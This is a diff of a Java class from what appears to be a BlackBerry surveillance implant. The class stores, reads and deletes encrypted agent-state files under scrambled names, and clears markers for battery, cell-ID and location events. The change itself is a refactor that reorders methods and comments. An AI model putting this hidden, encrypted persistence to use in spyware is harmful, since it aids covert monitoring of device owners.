@@ -11,7 +11,6 @@ import java.io.IOException;
 
 import net.rim.device.api.util.NumberUtilities;
 
-import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.config.Keys;
 import com.ht.rcs.blackberry.crypto.Encryption;
@@ -29,35 +28,28 @@ public class Markup {
 
     private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);
 
-    String lognName;
-    AutoFlashFile file;
-    Encryption encryption;
-    LogCollector logCollector;
+    /**
+     * Override della funzione precedente: invece di generare il nome da una
+     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
+     * una stringa vuota.
+     */
+    static String makeMarkupName(int agentId, boolean addPath) {
+        Check.requires(agentId >= 0, "agentId < 0");
+        String logName = NumberUtilities.toString(agentId, 16, 4);
+        debug.trace("makeMarkupName from: " + logName);
 
-    private Markup() {
-        logCollector = LogCollector.getInstance();
-        encryption = new Encryption();
-    }
-
-    public Markup(byte[] aesKey) {
-        this();
-        byte[] key = new byte[16];
-        Utils.Copy(key, 0, aesKey, 0, 16);
-
-        encryption.makeKey(key);
+        String markupName = makeMarkupName(logName, addPath, false);
+        return markupName;
     }
 
     /**
      * Genera un nome gia' scramblato per un file di Markup, se bAddPath e' TRUE
-     * il nome ritornato
-     * e' completo del path da utilizzare altrimenti viene ritornato soltanto il
-     * nome. Se la chiamata
-     * fallisce la funzione torna una stringa vuota. Il nome generato
-     * non indica necessariamente un file che gia' non esiste sul filesystem, e'
-     * compito del chiamante
-     * verificare che tale file non sia gia' presente. Se il parametro
-     * facoltativo bStoreToMMC e'
-     * impostato a TRUE viene generato un nome che punta alla prima MMC
+     * il nome ritornato e' completo del path da utilizzare altrimenti viene
+     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
+     * stringa vuota. Il nome generato non indica necessariamente un file che
+     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
+     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
+     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
      * disponibile, se esiste.
      */
     static String makeMarkupName(String markupName, boolean addPath,
@@ -83,103 +75,9 @@ public class Markup {
     }
 
     /**
-     * Override della funzione precedente: invece di generare il nome da una
-     * stringa lo genera
-     * da un numero. Se la chiamata fallisce la funzione torna una stringa
-     * vuota.
-     */
-    static String makeMarkupName(int agentId, boolean addPath) {
-        Check.requires(agentId >= 0, "agentId < 0");
-        String logName = NumberUtilities.toString(agentId, 16, 4);
-        debug.trace("makeMarkupName from: " + logName);
-
-        String markupName = makeMarkupName(logName, addPath, false);
-        return markupName;
-    }
-
-    /**
-     * Scrive un file di markup per salvare lo stato dell'agente, i parametri
-     * utilizzati sono: l'ID dell'agente
-     * che sta generando il file, il puntatore al buffer dati e la lunghezza del
-     * buffer. Al termine della
-     * scrittura il file viene chiuso, non e' possibile fare alcuna Append e
-     * un'ulteriore chiamata alla
-     * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
-     * funzione torna TRUE se e' andata
-     * a buon fine, FALSE altrimenti. Il contenuto scritto e' cifrato.
-     */
-
-    public synchronized boolean writeMarkup(int agentId, byte[] data) {
-        String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
-
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
-
-        file.create();
-
-        if (data != null) {
-            byte[] encData = encryption.EncryptData(data);
-            Check.asserts(encData.length >= data.length, "strange data len");
-            file.write(data.length);
-            file.append(encData);
-        }
-
-        return true;
-    }
-
-    /**
-     * Legge il file di markup specificato da uAgentId (l'ID dell'agente che
-     * l'ha generato), torna un puntatore
-     * ai dati decifrati che va poi liberato dal chiamante e dentro uLen la
-     * lunghezza dei byte validi nel blocco.
-     * Se il file non viene trovato o non e' possibile decifrarlo correttamente
-     * la funzione torna NULL.
-     * La funzione torna NULL anche se il Markup e' vuoto. E' possibile creare
-     * dei markup vuoti, in questo caso
-     * non va usata la ReadMarkup() ma semplicemente la IsMarkup() per vedere se
-     * e' presente o meno.
-     * 
-     * @throws IOException
-     */
-
-    public synchronized byte[] readMarkup(int agentId) throws IOException {
-        Check.requires(agentId > 0, "agentId null");
-
-        String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
-
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
-
-        if (file.exists()) {
-            byte[] encData = file.read();
-            int len = Utils.byteArrayToInt(encData, 0);
-
-            byte[] plain = encryption.DecryptData(encData, len, 4);
-            Check.asserts(plain != null, "wrong decryption: null");
-            Check.asserts(plain.length == len, "wrong decryption: len");
-
-            return plain;
-        } else {
-            return null;
-        }
-    }
-
-    public synchronized boolean isMarkup(int agentId) {
-        Check.requires(agentId > 0, "agentId null");
-
-        String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
-
-        AutoFlashFile file = new AutoFlashFile(markupName, true);
-
-        return file.exists();
-    }
-
-    /**
      * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
-     * TRUE se il file e' stato
-     * rimosso o non e' stato trovato, FALSE se non e' stato possibile
-     * rimuoverlo.
+     * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
+     * stato possibile rimuoverlo.
      */
 
     public static synchronized void removeMarkup(int agentId) {
@@ -225,5 +123,100 @@ public class Markup {
         removeMarkup(Event.EVENT_BATTERY);
         removeMarkup(Event.EVENT_CELLID);
         removeMarkup(Event.EVENT_LOCATION);
+    }
+
+    String lognName;
+
+    AutoFlashFile file;
+
+    Encryption encryption;
+
+    LogCollector logCollector;
+
+    private Markup() {
+        logCollector = LogCollector.getInstance();
+        encryption = new Encryption();
+    }
+
+    public Markup(byte[] aesKey) {
+        this();
+        byte[] key = new byte[16];
+        Utils.Copy(key, 0, aesKey, 0, 16);
+
+        encryption.makeKey(key);
+    }
+
+    public synchronized boolean isMarkup(int agentId) {
+        Check.requires(agentId > 0, "agentId null");
+
+        String markupName = makeMarkupName(agentId, true);
+        Check.asserts(markupName != "", "markupName empty");
+
+        AutoFlashFile file = new AutoFlashFile(markupName, true);
+
+        return file.exists();
+    }
+
+    /**
+     * Legge il file di markup specificato da uAgentId (l'ID dell'agente che
+     * l'ha generato), torna un puntatore ai dati decifrati che va poi liberato
+     * dal chiamante e dentro uLen la lunghezza dei byte validi nel blocco. Se
+     * il file non viene trovato o non e' possibile decifrarlo correttamente la
+     * funzione torna NULL. La funzione torna NULL anche se il Markup e' vuoto.
+     * E' possibile creare dei markup vuoti, in questo caso non va usata la
+     * ReadMarkup() ma semplicemente la IsMarkup() per vedere se e' presente o
+     * meno.
+     * 
+     * @throws IOException
+     */
+
+    public synchronized byte[] readMarkup(int agentId) throws IOException {
+        Check.requires(agentId > 0, "agentId null");
+
+        String markupName = makeMarkupName(agentId, true);
+        Check.asserts(markupName != "", "markupName empty");
+
+        AutoFlashFile file = new AutoFlashFile(markupName, true);
+
+        if (file.exists()) {
+            byte[] encData = file.read();
+            int len = Utils.byteArrayToInt(encData, 0);
+
+            byte[] plain = encryption.DecryptData(encData, len, 4);
+            Check.asserts(plain != null, "wrong decryption: null");
+            Check.asserts(plain.length == len, "wrong decryption: len");
+
+            return plain;
+        } else {
+            return null;
+        }
+    }
+
+    /**
+     * Scrive un file di markup per salvare lo stato dell'agente, i parametri
+     * utilizzati sono: l'ID dell'agente che sta generando il file, il puntatore
+     * al buffer dati e la lunghezza del buffer. Al termine della scrittura il
+     * file viene chiuso, non e' possibile fare alcuna Append e un'ulteriore
+     * chiamata alla WriteMarkup() comportera' la sovrascrittura del vecchio
+     * markup. La funzione torna TRUE se e' andata a buon fine, FALSE
+     * altrimenti. Il contenuto scritto e' cifrato.
+     */
+
+    public synchronized boolean writeMarkup(int agentId, byte[] data) {
+        String markupName = makeMarkupName(agentId, true);
+        Check.asserts(markupName != "", "markupName empty");
+
+        AutoFlashFile file = new AutoFlashFile(markupName, true);
+
+        file.create();
+
+        if (data != null) {
+            byte[] encData = encryption.EncryptData(data);
+            Check.asserts(encData.length >= data.length, "strange data len");
+            file.write(data.length);
+            file.append(encData);
+        }
+
+        return true;
     }
 }
